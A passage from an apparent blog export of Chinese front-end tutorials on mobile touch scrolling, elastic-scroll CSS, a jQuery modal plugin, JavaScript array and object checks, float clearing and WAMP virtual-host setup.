    <content type="text"><![CDATA[继续上一篇文章移动web页面支持弹性滚动解决方案，其实这里面的demo有一个小小的bug，现在为大家解决此bug，直接上图吧，看来就明白了！&emsp;&emsp;Bug描述：当页面向下滑动的时候，上面会有一片的微信盲区，以前也未特意的关注此方面，但是从用户体验方面看下值得去思考了，首先需要阻止document默认事件就ok了，但只阻止默认事件是不能满足，然后还需将某些需要touchmove的事件的元素阻止冒泡，关于此类事件的原理，在我曾经的博文中可以找到，直接在www.npm8.com的搜索栏里面搜索“事件冒泡”，虐过。。。。1234567document.addEventListener('touchmove',function(event)&#123;event.preventDefault();//阻止浏览器的默认事件&#125;,false);document.addEventListener('touchstart',function(event)&#123;event.preventDefault();//阻止浏览器的默认事件 &#125;,false);&emsp;&emsp;这样，左右滑动可以完成了，但是触摸一个div的时候，页面不能上下滑动了，怎么办？当touchmove的时候，实时改变window的scrolltop值？这样会有原生的滑动效果吗？问题已经解决了！最终代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var touchTarget, touchScreenX, touchScreenY, conditionParentUntilTrue, disableScroll;conditionParentUntilTrue = function (element, condition) &#123; var outcome; if (element === document.body) &#123; return false; &#125; outcome = condition(element); if (outcome) &#123; return true; &#125; else &#123; return conditionParentUntilTrue(element.parentNode, condition); &#125;&#125;;window.addEventListener('touchstart', function (e) &#123; touchTarget = e.targetTouches[0].target; scrollMap = &#123;&#125; scrollMap.left = conditionParentUntilTrue(touchTarget, function (element) &#123; return element.scrollLeft &gt; 0; &#125;); scrollMap.top = conditionParentUntilTrue(touchTarget, function (element) &#123; return element.scrollTop &gt; 0; &#125;); scrollMap.right = conditionParentUntilTrue(touchTarget, function (element) &#123; return element.scrollWidth &gt; element.clientWidth &amp;amp;&amp;amp; element.scrollWidth - element.clientWidth &gt; element.scrollLeft; &#125;); scrollMap.bottom =conditionParentUntilTrue(touchTarget, function (element) &#123; return element.scrollHeight &gt; element.clientHeight &amp;amp;&amp;amp; element.scrollHeight - element.clientHeight &gt; element.scrollTop; &#125;); touchScreenX = e.targetTouches[0].screenX; touchScreenY = e.targetTouches[0].screenY; disableScroll = false;&#125;);window.addEventListener('touchmove', function (e) &#123; var moveScreenX, moveScreenY; if (disableScroll) &#123; e.preventDefault(); return; &#125; moveScreenX = e.targetTouches[0].screenX; moveScreenY = e.targetTouches[0].screenY; if ( moveScreenX &gt; touchScreenX &amp;amp;&amp;amp; scrollMap.left || moveScreenY &lt; touchScreenY &amp;amp;&amp;amp; scrollMap.bottom || moveScreenX &lt; touchScreenX &amp;amp;&amp;amp; scrollMap.right || moveScreenY &gt; touchScreenY &amp;amp;&amp;amp; scrollMap.top ) &#123; &#125; else &#123; e.preventDefault(); disableScroll = true; &#125;&#125;);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>手机端页面上下滑动</tag>
        <tag>手机端页面上下滑动Bug</tag>
        <tag>手机端页面上下滑动空隙</tag>
        <tag>移动端页面上下滑动</tag>
        <tag>移动端页面上下滑动Bug</tag>
        <tag>移动端页面上下滑动空隙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动web页面支持弹性滚动解决方案]]></title>
    <url>%2F2016%2F03%2F08%2F%E7%A7%BB%E5%8A%A8web%E9%A1%B5%E9%9D%A2%E6%94%AF%E6%8C%81%E5%BC%B9%E6%80%A7%E6%BB%9A%E5%8A%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;一直折腾移动端页面弹性滚动的各种问题，做了点研究，今天做个小分享，首先本人不建议使用第三方js插件来做，一方面性能方面不是很好，另外一方面本身移动端的网络不是很快也不是稳定，加载会出现卡顿现象或者是运行出现问题，落叶归根，一切回归本质，强大的css3给予我们无比的力量！&emsp;&emsp;传统 pc 端中，子容器高度超出父容器高度，通常使用 overflow:auto 可出现滚动条拖动显示溢出的内容，而移动web开发中，由于浏览器厂商的系统不同、版本不同，导致有部分机型不支持对弹性滚动，从而在开发中制造了所谓的 BUG。&emsp;&emsp;上图如果在PC端中，我们可以利用 position:fixed 和 overflow:auto 进行简单的布局实现我们需要的效果，而在手机端遇到的问题如下：ios4 和 android2.2 以下不支持 position:fixedios 和 android2.3 以下不支持 overflow:autoios4 和 android 不支持 overflow-scrolling最严重的结果是：滚动区域内容无法拖动对于 ios4 和 android2.2 以下不支持 position:fixed 的问题，有2种布局方法可以替代。布局一： 定义页面整体高度为100%，然后使用 position:absolute 布局可解决12345678910111213141516171819/*&lt;!--absolute布局 [[ --&gt;&lt;body&gt;&lt;div class="wrap"&gt;&lt;div class="header"&gt;header&lt;/div&gt;&lt;div class="main"&gt;弹性滚动区域&lt;/div&gt;&lt;div class="footer"&gt;footer&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;!--absolute布局 ]] --&gt;*/html,body&#123;height:100%;&#125;.wrap&#123;width:100%;&#125;.header,.footer&#123;height:40px;line-height:40px;background-color:#D8D8D8;text-align:center;&#125;.header&#123;position: absolute;top:0;left:0;width:100%;&#125;.footer&#123;position: absolute;bottom:0;left:0;width:100%;&#125;.main&#123;position:absolute;z-index:1;top:40px;left:0;bottom:40px;width:100%;&#125;布局二： 定义页面整体高度为100%，然后使用 display:flex 布局可解决1234567891011121314151617/*&lt;!-- flex布局 [[ --&gt;&lt;body&gt;&lt;div class="wrap"&gt;&lt;div class="header"&gt;header&lt;/div&gt;&lt;div class="main"&gt;弹性滚动区域&lt;/div&gt;&lt;div class="footer"&gt;footer&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;!-- flex布局 ]] --&gt;*/html,body&#123;height:100%;&#125;.wrap&#123;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;width:100%;height:100%;&#125;.header,.footer&#123;height:40px;line-height:40px;background-color:#D8D8D8;text-align:center;&#125;.main&#123;-webkit-box-flex:1;-webkit-flex:1;-ms-flex:1;flex:1;width:100%;&#125;那么剩下的主要问题是子容器高度超出父容器高度，子容器内容如何弹性滚动。&emsp;&emsp;对于如何使用弹性滚动，这里并没有最好的方案，具体看产品的用户群、产品的定位等，简单介绍下：方案一： overflow:auto**和-webkit-overflow-scrolling: touch**适合场景：产品的用户群大多为 ios5+、android4+ 用户，建议采用 overflow-scrolling 做差异化体验，毕竟 iscroll4.js 在 android 机器下体验不顺畅，另外还加载了 10K 多的 js 代码。&emsp;&emsp;overflow:auto 写法在 winphone8 和 android4+ 上有用。ios5+ 版本增加了一个新的属性：overflow-scrolling 这个属性可以激活平滑滚动，效果不错。1234.css&#123;overflow:auto;/* winphone8和android4+ */-webkit-overflow-scrolling: touch; /* ios5+ */&#125;flex体验demo：http://demo.grycheng.com/case/csshuadong.html方案二： iscroll4.js和overflow:auto适合场景：产品的用户群有 ios 和大部分 android2+ 用户，而在 android 中的页面数据比较简单(通常弹性滚动数据只有文字)，那么使用 iscroll4.js 可保证 android2+ 的机器展现正常也不卡顿，让ios用户滚动更顺畅。&emsp;&emsp;使用 iscroll4.js 基本上解决了页面弹性滚动的问题，总结下 iscroll4.js 的体验：在 ios 系统上的表现十分良好，滚动顺畅在部分 android 系统上性能较差，特别是滚动区域内容多时，滚动页面会出现卡顿ios 和 android 系统下有不少 bug，如表单获焦弹出软键盘后页面高度没有重新计算、出现闪屏等(这里不做讨论)winphone 不支持那么这里的处理方案是，页面初始化时判断是 weibit 浏览器则启用 iscroll4.js123&lt;div class="wap ie-ova" id=""&gt;&lt;!-- webkit 用户设置 ID 为 iscroll，可启用iscroll --&gt; ...&lt;/div&gt;winphone8 手机使用如下 hack123@media screen and (-ms-high-contrast: active), (-ms-high-contrast: none) &#123;.ie-ova&#123;overflow:auto;&#125; /* winphone8 */&#125;方案三： iscroll4.js和overflow:auto和android2x.css适合场景：产品的用户群有 ios 和大部分 android2+ 用户，而在 android 中页面数据比较复杂(通常弹性滚动数据有大量图片)，那么可针对 android2+ 的机器做静态定位展现(position:static)，页面不具备滚动效果，而对于 ios 用户仍然使用 iscroll4.js。1&lt;link rel="stylesheet" href="android2x.css"&gt;&lt;!-- android2+ 用户多引用的css文件 --&gt;123.css&#123;overflow:auto;/* winphone8和android4+ */&#125;123&lt;div class="wap" id=""&gt;&lt;!-- ios 用户设置 ID 为 iscroll，可启用iscroll --&gt; ...&lt;/div&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css弹性滚动方案</tag>
        <tag>移动web页面支持弹性滚动解决方案</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[炫酷全屏式的弹窗jQuery插件 – animatedModal.js]]></title>
    <url>%2F2016%2F03%2F07%2F%E7%82%AB%E9%85%B7%E5%85%A8%E5%B1%8F%E5%BC%8F%E7%9A%84%E5%BC%B9%E7%AA%97jquery%E6%8F%92%E4%BB%B6-animatedmodal-js%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;animatedModal.js 是一个全屏式的弹窗jQuery插件，而且弹出效果很漂亮，全屏的弹窗特别适用于移动手机网站，所以做响应式网页的设计师们可以尝试使用这款插件。&emsp;&emsp;animatedModal.js 的弹出动画可以结合 animate.css 这个样式库来实现漂亮酷弦的动画特效。&emsp;&emsp;插件的min版只有2KB大小，对于普通站来这不算什么了，下面一起看看该弹窗代码的DEMO效果，真很好看，扁平化的风格设计。&nbsp;&nbsp;&nbsp;插件兼容性IE10+ChromeFirefoxSafariOpera使用教程STEP1: 在head内引入animate.css样式库123&lt;head&gt;&lt;link rel="stylesheet" href="animate.min.css"&gt;&lt;/head&gt;STEP2: HTML代码：在内加入以下代码12345678910111213141516&lt;body&gt;&lt;!--Call your modal--&gt;&lt;a id="demo01" href="#animatedModal"&gt;DEMO01&lt;/a&gt;&lt;!--DEMO01--&gt;&lt;div id="animatedModal"&gt;&lt;!--THIS IS IMPORTANT! to close the modal, the class name has to match the name given on the ID class="close-animatedModal" --&gt;&lt;div class="close-animatedModal"&gt; CLOSE MODAL&lt;/div&gt;&lt;div class="modal-content"&gt;&lt;!--Your modal content goes here--&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;STEP3: 嵌入jQuery库和插件JS，注意必须在你的HTML内容底部。12345&lt;body&gt;&lt;!--你的HTML内容--&gt;&lt;script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="yourPath/animatedModal.min.js"&gt;&lt;/script&gt;&lt;/body&gt;STEP4: 初始化123&lt;script&gt;$("#demo01").animatedModal();&lt;/script&gt;提示：下载的DMEO页面如果看不到效果，请检查的你浏览器，还有就是jQuery库的嵌入地址加上http:官方下载 &amp; 演示：http://joaopereirawd.github.io/animatedModal.js/]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>animatedModal.js</tag>
        <tag>全屏式的弹窗插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何判断一个对象是否是数组？]]></title>
    <url>%2F2016%2F03%2F04%2F%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1%E6%98%AF%E5%90%A6%E6%98%AF%E6%95%B0%E7%BB%84%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;我们知道在js中除了function以外的所有对象如果用typeof来判断的话，它们都显示Object，但是有时候我们并不想这样，比如我判断一个数组就应该是个数组而不是打印Object。12var arr = [];console.log(typeof arr); //object解决方法1：12var arr = [];console.log(arr.constructor.name==="Array"); //true解决方法2：12var arr = [];console.log(arr instanceof Array); //true解决方法3：12var arr = [];console.log(Object.prototype.toString.call(arr)==="[object Array]"); //true&emsp;&emsp;在这里我推荐方法3，另外如果你不知道这些方法都是什么意思，可以看一下[JS对象的几个方法]介绍这篇文章。&emsp;&emsp;如果你有一些基础，那么我给你解释一下方法3是怎么做到的。&emsp;&emsp;首先toString是obj的属性，我通过构造函数Object的原型改变它的toString方法。如果没有call打印的是prototype，用prototype.toString()打印出来的是Object，然后用call的话会将这个构造函数的this指向这个call里面的第一个参数，通过这样就可以打印它的类型了。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>如何判断一个对象是否是数组？</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS对象的几个方法介绍]]></title>
    <url>%2F2016%2F03%2F04%2Fjs%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%87%A0%E4%B8%AA%E6%96%B9%E6%B3%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[1、hasOwnProperty判断是不是对象自身的属性，如果是继承的返回false否则true123456789function Fn()&#123;&#125;Fn.prototype.num = 10;var obj = new Fn();obj.id = 1;console.log(obj.hasOwnProperty("id")); //trueconsole.log(obj.hasOwnProperty("num")); //false&nbsp;2、constructor返回对象的构造函数12var obj = new Function();console.log(obj.constructor); //function Function() &#123; [native code] &#125;&nbsp;3、instanceof判断对象是否在某个构造函数上1234var fn = new Function();console.log(fn instanceof Function); //trueconsole.log(fn instanceof Object); //trueconsole.log(fn instanceof String); //false&nbsp;4、toString把对象转换成字符串12var arr = [1,2,3];console.log(arr.toString()); //1,2,3&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>constructor</tag>
        <tag>hasOwnProperty</tag>
        <tag>instanceof</tag>
        <tag>toString</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[清除浮动详解]]></title>
    <url>%2F2016%2F03%2F04%2F%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本尊今天听某丝提起了清除浮动，刚开始以为清除浮动是个很简单的话题，但是仔细深入思考一下清除浮动，这个话题既简单又沉重，简单得说一下就懂了，沉重得只可意会不可言传，于是疯狂的翻阅了很多资料，浏览了很多网站，下面详细的为大家总结讲述一下清除浮动！清浮动小结1、{clear:both;}设置了clear&emsp;&emsp;属性的元素，其上边框位置会紧贴浮动元素的 margin-bottom 边界位置渲染，使包含浮动元素的容器高度正常。所以适用于浮动元素后面容器之内有个非浮动元素，或是额外添加一个新的空元素。2、.after-clear-float&emsp;&emsp;:after{content:””; display:block; clear:both;}利用伪类添加新元素，原理同上，所以只适用于父容器最后一级子元素是浮动的，即浮动元素后面没有非浮动元素把它和父容器隔开。只是IE6/7不支持:after 伪元素。3、{overflow:hidden;}或overflow:auto;&emsp;&emsp;创建了overflow 样式值为非visilbe的元素，实际上是创建了 CSS 2.1 规范定义的 Block Formatting Contexts，会重新计算其内部元素位置，从而获得确切高度。这样父容器也就包含了浮动元素高度。这个名词过于晦涩，在 CSS 3 草案中被变更为名词 Root Flow，顾名思义，是创建了一个新的根布局流，这个布局流是独立的，不影响其外部元素的。测试时当子元素同时混有浮动元素和非浮动元素时效果并不好。IE6/7 中并不被支持。4、{display:table}或{display:table-cell}&emsp;&emsp;当元素 display 值被设定为 table 或 table-cell 时，同样也创建了 CSS 2.1 规范定义的 Block Formatting Contexts。这样父容器也就包含了浮动元素高度。IE6/7 中并不被支持。5、使用表格类元素作为浮动元素容器。&emsp;&emsp;把浮动元素匡在td里就木有浮动问题，而且木有兼容问题。当使用 TABLE TD TH 等 TABLE 系列标签时， 元素的 display 值实际上说是 display: table 系列，这同样也创建了 CSS 2.1 规范定义的 Block Formatting Contexts。这样父容器也就包含了浮动元素高度。同时在 IE 6/7 中，TABLE TD TH 等 TABLE 系列标签天然拥有 haslayout 特性。&emsp;&emsp;浮动父元素。虽然这种方式并没有兼容问题，但实际使用中并不推荐。因为很容易推断出，页面中只要有一个浮动元素，使用该方法清理浮动将不可避免的使页面所有元素都浮动才可以达到预期效果。触发 hasLayout。下面是原文的这部分内容：样例：haslayout-clear-float:{width:1px}或.haslayout-clear-float:{height:1px}或.haslayout-clear-float:{zoom:1}&emsp;&emsp;’Layout’ 是 IE 的专有概念，它决定了元素如何对其内容进行定位和尺寸计算，与其他元素的关系和相互作用，以及对应用还有使用者的影响。&emsp;&emsp;’Layout’ 可以被某些 CSS property（特性）不可逆的触发，而某些 HTML 元素本身就具有 layout 。&emsp;&emsp;’Layout’ 在 IE 中可以通过 hasLayout 属性来判断一个元素是否拥有 layout ，如 object.currentStyle.hasLayout 。&emsp;&emsp;’Layout’ 是 IE 浏览器渲染引擎的一个内部组成部分。在 IE 浏览器中，一个元素要么自己对自身的内容进行组织和计算大小， 要么依赖于包含块来计算尺寸和组织内容。为了协调这两种方式的矛盾，渲染引擎采用了 ‘hasLayout’ 属性，属性值可以为 true 或 false。 当一个元素的 ‘hasLayout’ 属性值为 true 时，我们说这个元素有一个布局（layout），或拥有布局。默认拥有布局的元素：1234567&lt;html&gt;, &lt;body&gt;&lt;table&gt;, &lt;tr&gt;, &lt;th&gt;, &lt;td&gt;&lt;img&gt;&lt;hr&gt;&lt;input&gt;, &lt;button&gt;, &lt;select&gt;, &lt;textarea&gt;, &lt;fieldset&gt;, &lt;legend&gt;&lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt;, &lt;applet&gt;&lt;marquee&gt;==可触发 hasLayout 的 CSS 特性：==display: inline-blockheight: (除 auto 外任何值)width: (除 auto 外任何值)float: (left 或 right)position: absolutewriting-mode: tb-rlzoom: (除 normal 外任意值)==IE7 还有一些额外的属性(不完全列表)可以触发 hasLayout ：==min-height: (任意值)min-width: (任意值)max-height: (除 none 外任意值)max-width: (除 none 外任意值)overflow: (除 visible 外任意值，仅用于块级元素)overflow-x: (除 visible 外任意值，仅用于块级元素)overflow-y: (除 visible 外任意值，仅用于块级元素)position: fixedIE6 以前的版本（也包括 IE6 及以后所有版本的混杂模式，其实这种混杂模式在渲染方面就相当于 IE 5.5）， 通过设置任何元素的 ‘width’ 或 ‘height’（非auto）都可以触发 hasLayout ； 但在 IE6 和 IE7 的标准模式中的行内元素上却不行，设置 ‘display:inline-block’ 才可以。==注意兼容问题：==&emsp;&emsp;haslayout 特性仅 IE 支持，其他浏览器并无此特性。可以依靠计算布局清理浮动的 haslayout 特性仅在 IE 6/7 中存在，IE8 之后将使用 CSS 2.1 的 Block Formatting Contexts 定义来达到同样效果。注：IE hasLayout 特性厂商说明链接：hasLayout Property.aspx)&emsp;&emsp;以上内容是常见清理浮动手段生效的规范（和浏览器厂商特性）原理。我们希望页面开发者们，根据他们的兼容性特征以及实际情况来组合使用，以便达到实际项目目标。建议对于初学者我们推荐如下方式之一来清理浮动元素，它们均相对简单可靠：1、采用一个HTML标签，以及css的clear属性，来手工清理浮动；2、为元素设置 overflow:hidden 或 overflow:auto 值，配合可以设置 zoom:1 样式触发 IE6 haslayout 特性，来达到兼容所有浏览器清理浮动的目的。3、采用伪元素:after，配合可以设置 zoom:1 样式触发 IE6/7 haslayout 特性，来达到兼容所有浏览器清理浮动的目的。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>清除浮动</tag>
        <tag>清除浮动详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js滚动条的常用操作]]></title>
    <url>%2F2016%2F03%2F04%2Fjs%E6%BB%9A%E5%8A%A8%E6%9D%A1%E7%9A%84%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[网页可见区域宽： document.body.clientWidth;网页可见区域高： document.body.clientHeight;网页可见区域宽： document.body.offsetWidth (包括边线的宽);网页可见区域高： document.body.offsetHeight (包括边线的宽);网页正文全文宽： document.body.scrollWidth;网页正文全文高： document.body.scrollHeight;网页被卷去的高： document.body.scrollTop;网页被卷去的左： document.body.scrollLeft;网页正文部分上： window.screenTop;网页正文部分左： window.screenLeft;屏幕分辨率的高： window.screen.height;屏幕分辨率的宽： window.screen.width;屏幕可用工作区高度： window.screen.availHeight;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js滚动条</tag>
        <tag>js滚动条的常用操作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wamp改网站默认根目录,使用域名重定向,多站点配置]]></title>
    <url>%2F2016%2F02%2F08%2Fwamp%E6%94%B9%E7%BD%91%E7%AB%99%E9%BB%98%E8%AE%A4%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%BD%BF%E7%94%A8%E5%9F%9F%E5%90%8D%E9%87%8D%E5%AE%9A%E5%90%91%E5%A4%9A%E7%AB%99%E7%82%B9%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[wamp安装目录:C:\wamp安装wamp前保存的项目目录:E:\wamp\www先在源目录:C:\wamp中实现多站点配置:1.在C:\wamp\bin\apache\apache2.4.9\conf目录中文件:httpd.conf找到这一行#Include conf/extra/httpd-vhosts.conf去掉最前面的#(这样httpd-vhosts.conf文件才能生效)查找:(这里安装在c盘所以是c)&lt;Directory &quot;c:/wamp/www/&quot;&gt;再往下面# onlineoffline tag - don’t remove这一行下面这一行上面本来可能是:Deny from all或者是Allow from 127.0.0.1都用#在最前面加#号注释掉#Allow from 127.0.0.1#Deny from all添加一行:Allow from all2.在C:\wamp\bin\apache\apache2.4.9\conf\extra目录中文件:httpd-vhosts.conf添加下面配置:DocumentRoot “c:\wamp\www\test”ServerName test01.com在文件夹中:c:\wamp\www\test新建一个测试文件1.php3.在C:\Windows\System32\drivers\etc目录中文件:hosts用记事本打开,在最后添加一行127.0.0.1 test01.com重启wamp,在浏览器输入:test01.com/1.php能够正确访问说明配置成功第二部分:改网站源码的根目录是:e:\wamp\www1.在C:\wamp\bin\apache\apache2.4.9\conf目录文件:httpd.conf查找:DocumentRoot “c:/wamp/www/“改为:DocumentRoot “e:/wamp/www/“查找:&lt;Directory &quot;c:/wamp/www/&quot;&gt;改为:&lt;Directory &quot;e:/wamp/www/&quot;&gt;拷贝：index.php将C:/wamp/www/拷贝至e:/wamp/www/查找：$wampConfFile =$aliasDir =修改：$wampConfFile = ‘c:/wamp/wampmanager.conf’;$aliasDir = ‘c:/wamp/alias/‘;修改wampmanager.ini和wampmanager.tpl1 修改C:\wamp\wampmanager.ini:(1)打开：C:\wamp\wampmanager.ini(2)查找：Type: item; Caption: “www 目录”; Action: shellexecute; FileName: “c:/wamp/www/“; Glyph: 2(3)修改：Type: item; Caption: “www 目录”; Action: shellexecute; FileName: “e:/wamp/www/“; Glyph: 22 修改C:\wamp\wampmanager.tpl：（1）打开：C:\wamp\wampmanager.tpl（2）查找：Type: item; Caption: “${w_wwwDirectory}”; Action: shellexecute; FileName: “${wwwdir}”; Glyph: 2（3）修改：Type: item; Caption: “${w_wwwDirectory}”; Action: shellexecute; FileName: “e:/wamp/www/“; Glyph: 2在C:\wamp\bin\apache\apache2.4.9\conf\extra目录中文件:httpd-vhosts.conf配置:改一下,并且在e:\wamp\www\中建立项目testDocumentRoot “e:\wamp\www\test”ServerName test01.com重启wamp,浏览器测试,能够访问则成功配置.]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>wamp</tag>
        <tag>wamp使用域名重定向</tag>
        <tag>wamp多站点配置</tag>
        <tag>wamp改网站默认根目录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提高CSS文件可维护性的五种方法]]></title>
    <url>%2F2016%2F01%2F29%2F%E6%8F%90%E9%AB%98css%E6%96%87%E4%BB%B6%E5%8F%AF%E7%BB%B4%E6%8A%A4%E6%80%A7%E7%9A%84%E4%BA%94%E7%A7%8D%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;当完成一项前端的工作之后，许多人都会忘记该项目的结构与细节。然而代码并不是马上就能完全定型，在余下的时间里还有不断的维护工作，而这些工作也许不会是你自己完成。所以，结构优良的代码能很大程度上优化它的可维护性。下面列出五种提高CSS文件可维护性的方法，也就是一种较好的CSS样式指南。1.分解你的样式&emsp;&emsp;对于小项目，在写代码之前，按页面结构或页面内容将代码分为几块并给予注释。例如，可以分别将 全局样式、布局、字体样式、表单、评论和其他分为几个不同的块来继续工作。&emsp;&emsp;而对于较大的工程，这样显然不会有什么效果。此时，就需要将样式分解到几个不同的样式表文件。下面的master stylesheet 就是这一方法的例子，它的工作主要是导入其他样式文件。使用这一方法不仅能优化样式结构，而且有利于减少一些不必要的服务器请求。而分解文件的方法就有许多种，master stylesheet 使用了最常见的一种。&emsp;&emsp;同时对于大型项目，你也可以加上CSS文件的升级标志或者一些诊断措施，这里不再详述。2.建立CSS文件索引&emsp;&emsp;为了能够迅速的了解整个CSS文件的结构，在文件开头建立文件索引是一个不错的选择。一种可行的方法是建立树形的索引：结构上的id 和 class 都可以成为该树的一个分支。如下：[Layout]bodyHeader / #headerContent / #contentLeft column / #leftcolumnRight column / #rightcolumnSidebar / #sidebarRSS / #rssSearch / #searchBoxes / .boxSideblog / #sideblogFooter / #footerNavigation #navbarAdvertisements .adsContent header h2或者也可以这样：[Table of contents]1. Body2. Header / #header2.1. Navigation / #navbar3. Content / #content3.1. Left column / #leftcolumn3.2. Right column / #rightcolumn3.3. Sidebar / #sidebar3.3.1. RSS / #rss3.3.2. Search / #search3.3.3. Boxes / .box3.3.4. Sideblog / #sideblog3.3.5. Advertisements / .ads4. Footer / #footer&emsp;&emsp;另一种方式可以只是先简单的将内容列举出来，也不需要缩进。下面的一个例子中，如果你需要跳至RSS部分你只需要简单的搜索。[Table of contents]1. Body2. Header / #header3. Navigation / #navbar4. Content / #content5. Left column / #leftcolumn6. Right column / #rightcolumn7. Sidebar / #sidebar3.定义你的颜色和版式&emsp;&emsp;CSS 中我们无法使用常量，但是在编写颜色和版式方面的代码是我们会经常遇到可以使用很多次的类，在这里可以将之视为CSS 的常量。&emsp;&emsp;一种可以减小CSS无常量定义确定的方法是在CSS文件顶部的注释中下一些定义，也就是定义常量。一种最简单的应用就是创建一个颜色表。这样你就可以快速的了解整个页面的色彩，从而避免一些反复修改过程中的错误。如果你需要对颜色进行修改，你也可以很快找到它。[Color codes]Dark grey (text): #333333Dark Blue (headings, links) #000066Mid Blue (header) #333399Light blue (top navigation) #CCCCFFMid grey: #666666&emsp;&emsp;或者，你也可以选择描述你布局当中使用的颜色。对于一个给定的颜色，你可以将用到该颜色的块罗列出来。当然，你也可以选择按页面元素来罗列颜色。[Color codes]Background: #ffffff (white)Content: #1e1e1e (light black)Header h1: #9caa3b (green)Header h2: #ee4117 (red)Footer: #b5cede (dark black)a (standard): #0040b6 (dark blue)a (visited): #5999de (light blue)a (active): #cc0000 (pink)对于版式有同样的例子。[Typography]Body copy: 1.2em/1.6em Verdana, Helvetica, Arial, Geneva, sans-serif;Headers: 2.7em/1.3em Helvetica, Arial, “Lucida Sans Unicode”, Verdana, sans-serif;Input, textarea: 1.1em Helvetica, Verdana, Geneva, Arial, sans-serif;Sidebar heading: 1.5em Helvetica, Trebuchet MS, Arial, sans-serif;Notes: decreasing heading by 0.4em with every subsequent heading level4.格式化CSS属性&emsp;&emsp;当我们编写代码的时候，使用一些特殊的编码风格会对提高CSS代码的可读性有很大帮助。许多人都有各自不同的编码风格。一部分人习惯于将颜色和字体的代码放在前面，另外一部分则更喜欢将类似浮动和定位的更“重要”的属性放在前面。类似的，也可以将页面元素按照它在布局中的结构进行排序：12345678body,h1, h2, h3,p, ul, li,form &#123;border: 0;margin: 0;padding: 0;&#125;&emsp;&emsp;一些开发者用一种更为有意思的方法：他们将属性按首字母的顺序排列。值得注意的是，这样一种方法可能对某些浏览器会产生问题。不管自己的格式如何，你要确保你已经清晰的定义了这些格式方法。这样，你的同事在阅读你的代码的时候将会感谢你的努力。5.缩进会是你的朋友！&emsp;&emsp;为了让你的代码给人感觉更为直观，你可以使用一行来定义大纲元素的样式。当指定的选择器里的属性超过三个的时候，这种方式将带来混乱。但是，适度的使用这种方式，你可以很清楚的区分相同类的不同点。123#main-column &#123; display: inline; float: left; width: 30em; &#125;#main-column h1 &#123; font-family: Georgia, "Times New Roman", Times, serif; margin-bottom: 20px; &#125;#main-column p &#123; color: #333; &#125;&emsp;&emsp;同时，样式修改的维护也是个比较麻烦的问题。很多人修改样式之后就忘记了，结果后来又发现修改的样式导致了页面出错，不得不苦苦寻找。因此，为修改的样式构建一个特殊的格式就很必要了。一种很简单的方式是，给修改过的样式缩进，同时，也可以使用一些注释（比如”@new”）来做一个标识。1234567#sidebar ul li a &#123;display: block;background-color: #ccc;border-bottom: 1px solid #999; /* @new */margin: 3px 0 3px 0;padding: 3px; /* @new */&#125;&emsp;&emsp;总的来说，只有建立一个合适的样式指南才会对样式表的可读性有所帮助。记住，移去每一个对你理解文件没有帮助的样式指南，避免对过多的元素使用过多的样式指南。然后，为了一个可读性可维护性良好的CSS文件而努力吧。8. RSS / #rss9. Search / #search10. Boxes / .box11. Sideblog / #sideblog12. Advertisements / .ads13. Footer / #footer[8. RSS / #rss]#rss { … }#rss img { … }&emsp;&emsp;定义这样一个样式检索可以很有效的使其他人阅读学习你的代码变得容易。在制作大项目的时候，你也可以将检索打印出来从而在你阅读代码的时候方便查阅。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>提高CSS文件可维护性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[轻松使用px为单位开发移动端页面]]></title>
    <url>%2F2016%2F01%2F28%2F%E8%BD%BB%E6%9D%BE%E4%BD%BF%E7%94%A8px%E4%B8%BA%E5%8D%95%E4%BD%8D%E5%BC%80%E5%8F%91%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%A1%B5%E9%9D%A2%2F</url>
